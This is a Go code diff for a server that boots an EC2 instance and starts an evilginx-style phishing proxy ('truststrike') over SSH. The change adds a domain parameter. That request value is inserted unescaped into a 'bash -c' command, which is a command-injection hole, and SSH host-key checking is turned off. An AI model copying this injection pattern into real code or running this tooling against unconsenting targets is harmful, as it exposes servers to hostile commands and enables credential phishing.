@@ -90,7 +90,8 @@ func (as *Server) GetEC2Status(w http.ResponseWriter, r *http.Request) {
 // StartEC2Instance starts the EC2 instance and optionally starts evil
 func (as *Server) StartEC2Instance(w http.ResponseWriter, r *http.Request) {
 	var req struct {
-		StartEvilginx bool `json:"start_evil"`
+		StartEvilginx bool   `json:"start_evil"`
+		Domain        string `json:"domain"`
 	}
 	json.NewDecoder(r.Body).Decode(&req)
 
@@ -142,7 +143,7 @@ func (as *Server) StartEC2Instance(w http.ResponseWriter, r *http.Request) {
 	// Optionally start evil via SSH
 	sshMessage := ""
 	if req.StartEvilginx && publicIP != "" {
-		sshMessage = as.startEvilginxViaSSH(publicIP)
+		sshMessage = as.startEvilginxViaSSH(publicIP, req.Domain)
 	}
 
 	response := map[string]interface{}{
@@ -160,7 +161,7 @@ func (as *Server) StartEC2Instance(w http.ResponseWriter, r *http.Request) {
 }
 
 // startEvilginxViaSSH connects to the EC2 instance and starts evil in a screen session
-func (as *Server) startEvilginxViaSSH(publicIP string) string {
+func (as *Server) startEvilginxViaSSH(publicIP string, domain string) string {
 	cfg := as.config.EC2
 
 	// Wait for SSH to be ready (max 2 minutes)
@@ -185,9 +186,15 @@ func (as *Server) startEvilginxViaSSH(publicIP string) string {
 		return "SSH not ready after 2 minutes"
 	}
 
+	// Construct command with domain if provided
+	runCmd := "sudo ./truststrike -gui -gui-https"
+	if domain != "" {
+		runCmd += fmt.Sprintf(" -gui-domain %s", domain)
+	}
+
 	// Start evil in screen
-	sshCmd := fmt.Sprintf(`cd "%s" && if screen -list | grep -q "\.%s"; then screen -S "%s" -X quit; fi && screen -dmS "%s" bash -c "sudo ./truststrike -gui"`,
-		cfg.RemoteDir, cfg.ScreenName, cfg.ScreenName, cfg.ScreenName)
+	sshCmd := fmt.Sprintf(`cd "%s" && if screen -list | grep -q "\.%s"; then screen -S "%s" -X quit; fi && screen -dmS "%s" bash -c "%s"`,
+		cfg.RemoteDir, cfg.ScreenName, cfg.ScreenName, cfg.ScreenName, runCmd)
 
 	cmd := exec.Command("ssh",
 		"-o", "StrictHostKeyChecking=no",
